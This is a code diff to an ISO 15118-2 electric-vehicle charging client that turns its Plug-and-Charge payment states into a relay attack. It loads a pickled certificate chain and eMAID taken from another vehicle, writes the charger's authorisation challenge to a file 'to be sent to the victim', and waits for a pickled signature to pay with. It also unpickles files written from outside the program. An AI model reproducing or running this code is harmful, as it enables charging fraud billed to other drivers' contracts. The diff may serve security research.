@@ -4,6 +4,9 @@ V2GMessage objects of the ISO 15118-2 protocol, from SessionSetupRes to
 SessionStopRes.
 """
 
+import os
+import pickle
+import asyncio
 import logging
 from time import time
 from typing import Any, List, Union
@@ -461,14 +464,15 @@ class PaymentServiceSelection(StateEVCC):
                     return
             else:
                 try:
+                    while not os.path.isfile("./pnc-cert.pickle"):
+                        await asyncio.sleep(0.05)
+                    await asyncio.sleep(0.1)
+                    with open("./pnc-cert.pickle", "rb") as fd:
+                        pnc_cert = pickle.load(fd)
+
                     payment_details_req = PaymentDetailsReq(
-                        emaid=eMAID(get_cert_cn(load_cert(CertPath.CONTRACT_LEAF_DER))),
-                        cert_chain=load_cert_chain(
-                            protocol=Protocol.ISO_15118_2,
-                            leaf_path=CertPath.CONTRACT_LEAF_DER,
-                            sub_ca2_path=CertPath.MO_SUB_CA2_DER,
-                            sub_ca1_path=CertPath.MO_SUB_CA1_DER,
-                        ),
+                        emaid=pnc_cert["emaid"],
+                        cert_chain=pnc_cert["chain"],
                     )
                 except FileNotFoundError as exc:
                     self.stop_state_machine(f"Can't find file {exc.filename}")
@@ -596,8 +600,7 @@ class CertificateInstallation(StateEVCC):
             Namespace.ISO_V2_MSG_DEF,
         )
 
-
-class PaymentDetails(StateEVCC):
+class OriginalPaymentDetails(StateEVCC):
     """
     The ISO 15118-2 state in which the EVCC processes a
     AuthorizationRes from the SECC.
@@ -626,7 +629,6 @@ class PaymentDetails(StateEVCC):
         authorization_req = AuthorizationReq(
             id="id1", gen_challenge=payment_details_res.gen_challenge
         )
-
         try:
             signature = create_signature(
                 [
@@ -655,6 +657,53 @@ class PaymentDetails(StateEVCC):
             )
             return
 
+class PaymentDetails(StateEVCC):
+    """
+    The ISO 15118-2 state in which the EVCC processes a
+    AuthorizationRes from the SECC.
+    """
+
+    def __init__(self, comm_session: EVCCCommunicationSession):
+        super().__init__(comm_session, Timeouts.PAYMENT_DETAILS_REQ)
+
+    async def process_message(
+        self,
+        message: Union[
+            SupportedAppProtocolReq,
+            SupportedAppProtocolRes,
+            V2GMessageV2,
+            V2GMessageV20,
+            V2GMessageDINSPEC,
+        ],
+        message_exi: bytes = None,
+    ):
+        msg = self.check_msg_v2(message, PaymentDetailsRes)
+        if not msg:
+            return
+
+        payment_details_res: PaymentDetailsRes = msg.body.payment_details_res
+        authorization_req = AuthorizationReq(
+            id="id1", gen_challenge=payment_details_res.gen_challenge
+        )
+
+        # write out the challenge to be sent to the victim
+        with open("./gen-challenge.bin", "wb") as fd:
+            fd.write(payment_details_res.gen_challenge)
+
+        # wait for the signature to be available and use it to pay
+        while not os.path.isfile("./pnc-signature.pickle"):
+            await asyncio.sleep(0.05)
+        await asyncio.sleep(0.1)
+        with open("./pnc-signature.pickle", "rb") as fd:
+            signature = pickle.load(fd)
+
+        self.create_next_message(
+            Authorization,
+            authorization_req,
+            Timeouts.AUTHORIZATION_REQ,
+            Namespace.ISO_V2_MSG_DEF,
+            signature=signature,
+        )
 
 class Authorization(StateEVCC):
     """
